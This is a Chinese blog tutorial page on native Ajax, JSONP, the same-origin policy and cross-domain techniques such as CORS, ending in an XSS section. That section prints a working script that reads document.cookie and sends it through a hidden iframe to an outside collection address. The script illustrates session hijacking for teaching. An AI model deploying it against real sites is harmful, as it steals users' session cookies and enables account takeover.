@@ -1,0 +1,578 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>原生Ajax使用实现、同源策略及CORS等跨域方案 | Lx15的博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="Lx15">
+    
+
+    
+    <meta name="description" content="总是在用ajax,但是原理实现并不清楚，总是会和同源策略打交道，但具体是什么也说不清楚，总在用跨域方案，但问我怎么跨域的又是不知其所以然，所以这篇文章就是解决自己的这些问题，如果你也是这种情况，那你也可以看看哦^^">
+<meta property="og:type" content="article">
+<meta property="og:title" content="原生Ajax使用实现、同源策略及CORS等跨域方案">
+<meta property="og:url" content="http://lx15.github.io/2017/02/21/Ajax_Json_Jsonp/index.html">
+<meta property="og:site_name" content="Lx15的博客">
+<meta property="og:description" content="总是在用ajax,但是原理实现并不清楚，总是会和同源策略打交道，但具体是什么也说不清楚，总在用跨域方案，但问我怎么跨域的又是不知其所以然，所以这篇文章就是解决自己的这些问题，如果你也是这种情况，那你也可以看看哦^^">
+<meta property="og:updated_time" content="2017-02-24T12:11:37.020Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="原生Ajax使用实现、同源策略及CORS等跨域方案">
+<meta name="twitter:description" content="总是在用ajax,但是原理实现并不清楚，总是会和同源策略打交道，但具体是什么也说不清楚，总在用跨域方案，但问我怎么跨域的又是不知其所以然，所以这篇文章就是解决自己的这些问题，如果你也是这种情况，那你也可以看看哦^^">
+
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="Lx15的博客" title="Lx15的博客"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Lx15的博客">Lx15的博客</a></h1>
+				<h2 class="blog-motto">阿弥陀佛么么哒~~~</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">主页</a></li>
+					
+						<li><a href="/archives">归档</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:lx15.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017/02/21/Ajax_Json_Jsonp/" title="原生Ajax使用实现、同源策略及CORS等跨域方案" itemprop="url">原生Ajax使用实现、同源策略及CORS等跨域方案</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="Lx15" target="_blank" itemprop="author">Lx15</a>
+		
+  <p class="article-time">
+    <time datetime="2017-02-21T05:37:59.000Z" itemprop="datePublished"> 发表于 2017-02-21</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ajax-基础知识"><span class="toc-number">1.</span> <span class="toc-text">Ajax 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XHR基本用法"><span class="toc-number">1.1.</span> <span class="toc-text">XHR基本用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XHR操作Http请求头部与响应头部的方法"><span class="toc-number">1.2.</span> <span class="toc-text">XHR操作Http请求头部与响应头部的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XHR-2级"><span class="toc-number">1.3.</span> <span class="toc-text">XHR 2级</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FormData-类型"><span class="toc-number">1.3.1.</span> <span class="toc-text">FormData 类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#overrideMimeType"><span class="toc-number">1.3.2.</span> <span class="toc-text">overrideMimeType()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#进度事件"><span class="toc-number">1.3.3.</span> <span class="toc-text">进度事件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ajax-原生使用及Jsonp实现"><span class="toc-number">2.</span> <span class="toc-text">Ajax 原生使用及Jsonp实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ajax-解决浏览器的缓存方案"><span class="toc-number">3.</span> <span class="toc-text">Ajax 解决浏览器的缓存方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#同源策略"><span class="toc-number">4.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#规避同源策略（跨域方案）"><span class="toc-number">5.</span> <span class="toc-text">规避同源策略（跨域方案）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#图像Ping"><span class="toc-number">5.1.</span> <span class="toc-text">图像Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsonp"><span class="toc-number">5.2.</span> <span class="toc-text">jsonp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebSocket"><span class="toc-number">5.3.</span> <span class="toc-text">WebSocket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#window-postMessage"><span class="toc-number">5.4.</span> <span class="toc-text">window.postMessage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS"><span class="toc-number">5.5.</span> <span class="toc-text">CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#简单请求"><span class="toc-number">5.5.1.</span> <span class="toc-text">简单请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#非简单请求"><span class="toc-number">5.5.2.</span> <span class="toc-text">非简单请求</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-与CSRF"><span class="toc-number">6.</span> <span class="toc-text">XSS 与CSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文献"><span class="toc-number">7.</span> <span class="toc-text">参考文献</span></a></li></ol>
+		
+		</div>
+		
+		<p>  总是在用ajax,但是原理实现并不清楚，总是会和同源策略打交道，但具体是什么也说不清楚，总在用跨域方案，但问我怎么跨域的又是不知其所以然，所以这篇文章就是解决自己的这些问题，如果你也是这种情况，那你也可以看看哦^^<br><a id="more"></a></p>
+<h2 id="Ajax-基础知识"><a href="#Ajax-基础知识" class="headerlink" title="Ajax 基础知识"></a>Ajax 基础知识</h2><p>  Ajax是异步的JavaScript和XML，是无需重新加载整个网页的情况下能够更新部分网页的技术，用来进行局部交换。Ajax 使用是通过XMLHttpRequest对象进行操作      </p>
+<h3 id="XHR基本用法"><a href="#XHR基本用法" class="headerlink" title="XHR基本用法"></a>XHR基本用法</h3><p>  1) 创建一个XMLHttpRequest实例 var xhr = new XMLHttpRequest()<br>  2) 启动一个请求 xhr.open(请求方法，请求路径，是否异步)<br>  3) 给xhr对象添加事件处理程序onreadystatechange。 在异步情况下，可以通过检测xhr对象的readyState属性，这个属性表示当前的活动阶段。这个属性值发生变化时都会触发onreadystatechange事件。</p>
+<pre><code>&gt;  注意: 必须在调用open()之前指定onreadystatechange事件处理程序才能确保跨浏览器的兼容性      
+</code></pre><p>  4) 发送请求 xhr.send(),send() 方法中的参数是作为http 请求body 发送的数据。不需要发送数据如get方法，则发送null<br>  5) 收到响应后的数据会自动填充xhr对象。 无论内容类型是什么，响应主体的内容都会保存到responseText,status决定响应的状态          </p>
+<h3 id="XHR操作Http请求头部与响应头部的方法"><a href="#XHR操作Http请求头部与响应头部的方法" class="headerlink" title="XHR操作Http请求头部与响应头部的方法"></a>XHR操作Http请求头部与响应头部的方法</h3><p>以上是XHR的基本用法，除此之外，XHR还提供了操作Http请求头部与响应头部的方法：<br>  1) 默认情况下，在发送XHR请求的同时，会发送这些头部：Accept ,Accept-Charset,Accept-Encoding,Accept-Language, Connection,Cookie,Host,Referer(发出请求的页面的URI)，User-Agent<br>  2) 可以自定义发出的请求头 xhr.setRequestHeader(name,value).</p>
+<pre><code>&gt; `注意：`必须在调用open()方法之后且调用send()方法之前调用setRequestHeader           
+</code></pre><p>  3) 调用xhr.getResponseHeader(name) 可以取得相应的响应头部信息。 调用getALlResponseHeaders() 可以得到包含所有头部信息的字符串。<br>  4) 在发送ＧＥＴ请求时，查询字符串中的每个参数的名称和值都必须使用encodeURIComponent()进行编码，所有键值对用&amp;分隔</p>
+<h3 id="XHR-2级"><a href="#XHR-2级" class="headerlink" title="XHR 2级"></a>XHR 2级</h3><h4 id="FormData-类型"><a href="#FormData-类型" class="headerlink" title="FormData 类型"></a>FormData 类型</h4><p>FormData类型可以用来序列化表单数据</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> data = <span class="keyword">new</span> FormData()</div><div class="line">data.append(name,value);</div><div class="line"><span class="comment">// or </span></div><div class="line"><span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">"form"</span>)</div><div class="line">xhr.send(<span class="keyword">new</span> FormData(form)</div></pre></td></tr></table></figure>
+<p>使用FormData时不用设置XHR对象上的请求头（在xhr 0级时还需要进行设置 application/x-www-form-urlencoded）,xhr能够识别传入的数据类型是FormData的实例，并自动的配置适当的头部信息。</p>
+<h4 id="overrideMimeType"><a href="#overrideMimeType" class="headerlink" title="overrideMimeType()"></a>overrideMimeType()</h4><p> 此方法用于重写浏览器处理响应的MIME类型</p>
+<h4 id="进度事件"><a href="#进度事件" class="headerlink" title="进度事件"></a>进度事件</h4><p>  loadstart ,progress,error,abort,load,loadend</p>
+<h2 id="Ajax-原生使用及Jsonp实现"><a href="#Ajax-原生使用及Jsonp实现" class="headerlink" title="Ajax 原生使用及Jsonp实现"></a>Ajax 原生使用及Jsonp实现</h2><p>  以下代码时ajax的原生使用 还包括对于jsonp的使用，低对于jsonp 的具体解释在 <code>跨域方案</code>中进行解释   </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 原生Ajax实现</span></div><div class="line">        <span class="function"><span class="keyword">function</span>  <span class="title">ajax</span>(<span class="params">params</span>)</span>&#123;</div><div class="line">           params = params || &#123;&#125;</div><div class="line">           params.data = params.data || &#123;&#125;</div><div class="line">           <span class="comment">// 判断是ajax 请求还是jsonp请求</span></div><div class="line">           <span class="keyword">var</span> json = params.jsonp?jsonp(params):json(params);</div><div class="line"></div><div class="line">           <span class="function"><span class="keyword">function</span> <span class="title">json</span>(<span class="params">params</span>)</span>&#123;</div><div class="line">               params.type = (params.type || <span class="string">'GET'</span>).toUpperCase()</div><div class="line">               <span class="comment">// 避免有特殊字符，必须格式化传输数据</span></div><div class="line">               params.data = formatParams(params.data);</div><div class="line">               <span class="keyword">var</span> xhr = <span class="literal">null</span>;</div><div class="line"></div><div class="line">               <span class="comment">// 实例化 XMLHttpRequest对象</span></div><div class="line">               <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)&#123;</div><div class="line">                   xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">               &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="comment">// ie6及其以下版本</span></div><div class="line">                xhr = <span class="keyword">new</span> ActiveObject(<span class="string">'Microsoft.XMLHTTP'</span>);</div><div class="line">               &#125;</div><div class="line"></div><div class="line">               <span class="comment">// 监听事件只要readyState的值发生变化，就会调用readystatechange事件</span></div><div class="line">               xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">                  <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span>)&#123;</div><div class="line">                      <span class="keyword">var</span> status = xhr.status;</div><div class="line">                      <span class="keyword">if</span>(status&gt;=<span class="number">200</span> &amp;&amp; status&lt;<span class="number">300</span> || status === <span class="number">304</span>)&#123;</div><div class="line">                          <span class="keyword">var</span> response = <span class="string">''</span></div><div class="line">                          <span class="comment">// 判断接收数据的内容类型</span></div><div class="line">                          <span class="keyword">var</span> type = xhr.getResponseHeader(<span class="string">'Content-type'</span>)</div><div class="line">                          <span class="comment">// 无论内容类型是什么，响应body中的内容都会保存到responseText 属性中。</span></div><div class="line">                          response = xhr.responseText;</div><div class="line">                          params.success &amp;&amp; params.success(response)</div><div class="line">                      &#125;<span class="keyword">else</span>&#123;</div><div class="line">                          params.error &amp;&amp; params.error(response)</div><div class="line">                      &#125;</div><div class="line">                  &#125;</div><div class="line">               &#125;</div><div class="line"></div><div class="line">               <span class="comment">// 连接和传输数据</span></div><div class="line">               <span class="keyword">if</span>( params.type.toUpperCase() === <span class="string">'GET'</span>)&#123;</div><div class="line">                   xhr.open(params.type,params.url+<span class="string">'?'</span>+params.data,<span class="literal">true</span>)</div><div class="line">                   xhr.send(<span class="literal">null</span>)</div><div class="line">               &#125; <span class="keyword">else</span> &#123;</div><div class="line">                   xhr.open(params.type,params.url,<span class="literal">true</span>)</div><div class="line">                   <span class="comment">// 设置提交时的内容类型</span></div><div class="line">                   xhr.setRequestHeader(<span class="string">'Content-type'</span>,<span class="string">'application/x-www-form-urlencoded,text/html,application/json,charset=UTF-8'</span>)</div><div class="line">                   xhr.send(params.data)</div><div class="line">               &#125;</div><div class="line">           &#125;</div><div class="line">               <span class="function"><span class="keyword">function</span> <span class="title">formatParams</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">                   <span class="keyword">var</span> arr = []</div><div class="line">                   <span class="keyword">for</span>(<span class="keyword">var</span> name <span class="keyword">in</span> data)&#123;</div><div class="line">                    <span class="comment">// encodeURIComponent():用于对URI中的某一部分编码</span></div><div class="line">                    arr.push(<span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span> +<span class="built_in">encodeURIComponent</span>(data[name]))</div><div class="line"></div><div class="line">                   &#125;</div><div class="line">                   <span class="comment">// 添加一个随机参数，防止缓存</span></div><div class="line">                   arr.push(<span class="string">'v='</span>+random())</div><div class="line">                   <span class="keyword">return</span> arr.join(<span class="string">'&amp;'</span>)</div><div class="line">               &#125;</div><div class="line">               <span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params"></span>)</span>&#123;</div><div class="line">                   <span class="keyword">return</span> <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">1000</span>);</div><div class="line">               &#125;</div><div class="line"></div><div class="line">               <span class="function"><span class="keyword">function</span> <span class="title">jsonp</span> (<span class="params">params</span>)</span>&#123;</div><div class="line">                <span class="comment">// 创建script标签并加入页面中</span></div><div class="line">                <span class="keyword">var</span> callbackName = params.jsonp;</div><div class="line">                <span class="keyword">var</span> head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"head"</span>)[<span class="number">0</span>];</div><div class="line">                <span class="comment">// 设置传递给后台的回调参数名</span></div><div class="line">                params.data[<span class="string">'callback'</span>] = callbackName</div><div class="line">                <span class="keyword">var</span> data = formatParams(params.data)</div><div class="line">                <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>)</div><div class="line">                  head.appendChild(script)</div><div class="line"></div><div class="line">                  <span class="built_in">window</span>[callbackName] = <span class="function"><span class="keyword">function</span>(<span class="params">json</span>)</span>&#123;</div><div class="line">                      head.removeChild(script);</div><div class="line">                      params.success &amp;&amp; params.success(json)</div><div class="line">                      <span class="built_in">window</span>.callbackName = <span class="literal">null</span></div><div class="line">                  &#125;</div><div class="line">                  <span class="comment">// 发送请求</span></div><div class="line">                  script.src = params.url +<span class="string">'?'</span>+data</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line"><span class="comment">// =======================使用案例=======================================</span></div><div class="line">            ajax(&#123;</div><div class="line">                url:<span class="string">'http://localhost:3000/ajax'</span>,</div><div class="line">                type:<span class="string">'GET'</span>,</div><div class="line">                data:&#123;</div><div class="line">                    <span class="string">'hi'</span>:<span class="string">'comeon'</span></div><div class="line">                &#125;,</div><div class="line">                success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</div><div class="line">                 <span class="built_in">console</span>.log(res)</div><div class="line">                &#125;,</div><div class="line">                error:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</div><div class="line">                    <span class="built_in">console</span>.log(error)</div><div class="line">                &#125;</div><div class="line"></div><div class="line">            &#125;)</div><div class="line">			ajax(&#123;</div><div class="line">                url:<span class="string">'http://localhost:3000/jsonp'</span>,</div><div class="line">                jsonp: <span class="string">'jsonpCallback'</span>,</div><div class="line">                data:&#123;</div><div class="line">                    <span class="string">'hi'</span>:<span class="string">'comeon'</span></div><div class="line">                &#125;,</div><div class="line">                success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</div><div class="line">                   <span class="built_in">console</span>.log(res)</div><div class="line">                &#125;,</div><div class="line">                error:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</div><div class="line">                    <span class="built_in">console</span>.log(error)</div><div class="line">                &#125;</div><div class="line"></div><div class="line">            &#125;)</div></pre></td></tr></table></figure>
+<p>后端可采用 node </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">app.get(<span class="string">'/ajax'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</div><div class="line">res.json(&#123;a:<span class="string">'this is from  server for ajax'</span>&#125;)</div><div class="line">&#125;)</div><div class="line">app.get(<span class="string">'/jsonp'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</div><div class="line">res.jsonp(&#123;</div><div class="line">	<span class="string">'a'</span>:<span class="string">'this from server for jsonp'</span>&#125;)</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
+<h2 id="Ajax-解决浏览器的缓存方案"><a href="#Ajax-解决浏览器的缓存方案" class="headerlink" title="Ajax 解决浏览器的缓存方案"></a>Ajax 解决浏览器的缓存方案</h2><ol>
+<li>在ajax发送前添加 xhr.setRequestHeader(‘If-Modified-since’,’0’)</li>
+<li>在ajax发送前添加 xhr.setRequestHeader(‘Cache-Control’,’no-cache’)</li>
+<li>在URL后面添加随机数 ：’a=’+Math.random()</li>
+<li>在URL后面添加时间戳’time=’+new Date().getTime()</li>
+<li>如果是jQUery，可以$.ajaxSetup({cache:false})</li>
+</ol>
+<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>ajax 能异步刷洗页面了，这是多流弊的事情，然而再牛还是有克星，那就是同源策略。ajax 只能在同源下使用。那同源策略是什么呢？<br>同源必须是： 协议相同、域名相同、端口相同。完了，就这样。        </p>
+<ol>
+<li>Http://   2. www   .   3. abc.com   : 4.  8080      /     5. scripts/jquery.js<br>1.协议    2.子域名    3.主域名    4.端口号   5.请求资源地址 </li>
+</ol>
+<p>当协议、子域名、主域名、端口号中任意一个不相同时，都算作不同域。不同域之间相互请求资源，都算作“跨域”。在JS的同源策略下，a.com域名下的JS无法操作b.com或c.com域名下的对象。<br>同源策略是很重要的，不然浏览器整个就不安全了，恶意网站随意更改你网站的信息获取消息啥的。。。。</p>
+<p>在同源策略下，有三种行为会受到限制：</p>
+<blockquote>
+<p>Cookie，LocalStorage和 IndexDB 无法获取<br>DOM 无法获取<br>Ajax 无法发送</p>
+</blockquote>
+<p>在很长一段时间 我是搞不清楚同源策略和跨域资源共享的（CORS）,我总觉得是一回事，然而他俩是鸡和蛋的关系。</p>
+<h2 id="规避同源策略（跨域方案）"><a href="#规避同源策略（跨域方案）" class="headerlink" title="规避同源策略（跨域方案）"></a>规避同源策略（跨域方案）</h2><p>浏览器就是这样叼。在给了加了层围墙之后发现不行还得出去，就会给你再开一道门，然后弄几个通行证。在浏览器没有开通门之前，迫于无奈，总是会有一些hack出现。</p>
+<p>在 学习跨域方案时，我发现了阮一峰老师的两篇博文 <a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="external">浏览器同源政策及其规避方法</a> 与<a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="external">跨域资源共享 CORS 详解</a> ，写的是真好啊，但是老师的毕竟不是自己的，所以想用自己的思路解释一下。</p>
+<h3 id="图像Ping"><a href="#图像Ping" class="headerlink" title="图像Ping"></a>图像Ping</h3><p>一个网页可以从任何网页中加载图像，不用担心跨域。图像Ping 是与服务器进行简单、单向的跨域通信的一种方式 ，请求的数据是通过查询字符串形式发送的，而响应可以是任意内容。通过图像Ping,浏览器得不到任何具体的数据，但通过监听load 和error 事件，能知道响应是什么时候收到的。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</div><div class="line">img.onload = img.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line"> alert(<span class="string">"收到了！"</span>)</div><div class="line">&#125;</div><div class="line">img.src=<span class="string">"http://baidu.com/a?a=b"</span>;</div></pre></td></tr></table></figure>
+<h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3><p>基本思想是：网页通过<code>&lt;script&gt;</code>标签来向服务器请求JSON数据,将从服务器得到的数据放入在请求url指定的回调函数中。由于回调函数名称只能在url中进行指定，所以只能发送<code>GET</code>请求。实现参看上面的 <code>Ajax 原生使用及Jsonp实现</code> .</p>
+<h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><p>WebSocket 是一种通信协议，使用非加密的<code>ws://</code> 和加密的<code>wss://</code>作为协议前缀。这个协议是不实行同源策略的，只要服务器支持，就可以通过它进行跨源通信。服务器会根据来自浏览器请求头中的<code>origin</code>字段来判断这个域名是否在白名单中，依次作出响应。   </p>
+<h3 id="window-postMessage"><a href="#window-postMessage" class="headerlink" title="window.postMessage"></a>window.postMessage</h3><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p> 哈哈哈。。。。先笑两声。。。因为我觉得这是最好的方案了，简单易行。对于浏览器来说只要版本比较新就可以啦，根本不用设置什么。对于服务器也只是简单的设置，所以最好用啦。那CORS是个什么咧？<br> CORS是<code>跨域资源共享(Cross-origin resource sharing)</code>,允许浏览器向跨源服务器，发出Ajax请求，不用在乎同源限制。整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的Ajax通信没有差别，代码完全一样。浏览器一旦大仙Ajax请求跨域，就会自动添加了一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p>
+<p> CORS 的基本思想就是： 使用自定义的HTTP头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。</p>
+<p>浏览器将CORS请求分成两类： 简单请求 和 非简单的请求</p>
+<h4 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h4><p>   当请求方法是<code>HEAD</code>,<code>GET</code>,<code>POST</code>方法之一，HTTP头信息不超过<code>Accept</code>,<code>Accept-Language</code>,<code>Content-Language</code>,<code>Last-Event-ID</code>,<code>Content-type</code>这些字段，并且<code>Content-type</code>这个字段的值限于<code>application/x-www-form-urlencoded</code>,<code>multipart/form-data</code>,<code>text/plain</code>这三种值。<br>   满足了上面的请求就是简单请求。<br>   对于简单请求，浏览器会直接发出CORS请求。 具体是直接在头信息中，增加一个<code>origin</code>字段，<code>origin</code>字段用来说明请求来自哪个域(协议+域名+端口)。服务器根据这个值来判断是否同意这个请求。<br>   如果服务器认为这个请求是可以接受的，就在<code>Access-Control-Allow-Origin</code>头部中回发相同的源信息(如果是公共资源，可以回发”*”)。</p>
+<h4 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h4><p>除了简单请求之外就是非简单请求。 对于非简单请求，会在正式通信前，增加一次HTTP查询请求，称为”预检”请求（preflight），是一种叫做 Preflighted Requests 的透明服务器验证机制。</p>
+<p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单中，以及可以使用哪些HTTP请求方法和头信息字段，只有得到肯定的回复，浏览器才会发出正式的XMLHttpRequest请求，否则就会报错。</p>
+<p>预检请求使用的方法是 <code>OPTIONS</code>,表示这个请求是用来询问的。 若是浏览器在发请求时 自定义了请求头 <code>xhr.setRequestHeader(&#39;X-Custom-Header&#39;,&#39;hahha&#39;)</code>,则在发送预检请求时在请求头中会出现<code>Access-Control-Request-Headers:X-Custom-Header</code>  。<br>一旦浏览器通过了预检请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个<code>Origin</code>字段，服务器的回应，也都会有一个<code>Access-Control-Allow-Origin</code>字段。</p>
+<blockquote>
+<p>但是在实际测试时 当前后端不分离的情况下这种非简单请求是可以跨域的，但是在前后端分离的情况下，这种非简单请求是不可以跨域的，这是为什么呢？ 我还不清楚，你若是知道，可以留言告诉我么？</p>
+<p> 除了上面的方法之外，还有像iFrame ，document.cookie跨二级域名，window.name 等方法，对于Iframe 我并没有实际使用过，等以后再总结吧。</p>
+</blockquote>
+<h2 id="XSS-与CSRF"><a href="#XSS-与CSRF" class="headerlink" title="XSS 与CSRF"></a>XSS 与CSRF</h2><p>XSS 全称“跨站脚本”，是注入攻击的一种。通过XSS攻击，设置利用js脚本调用document.cookie 以窃取Cookie 信息，盗走用户的session_id ,然后使用此会话id伪装成用户，达到攻击的目的。这就是会话劫持（Session Hijack）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</div><div class="line">	<span class="comment">// 构造泄露信息用的 URL</span></div><div class="line">	<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</div><div class="line">	<span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</div><div class="line">	<span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</div><div class="line">	<span class="comment">// 建立隐藏 iframe 用于通讯</span></div><div class="line">	<span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</div><div class="line">	hideFrame.height = <span class="number">0</span>;</div><div class="line">	hideFrame.width = <span class="number">0</span>;</div><div class="line">	hideFrame.style.display = <span class="string">"none"</span>;</div><div class="line">	hideFrame.src = xssURI;</div><div class="line">	<span class="comment">// 开工</span></div><div class="line">	<span class="built_in">document</span>.body.appendChild(hideFrame);</div><div class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</div></pre></td></tr></table></figure>
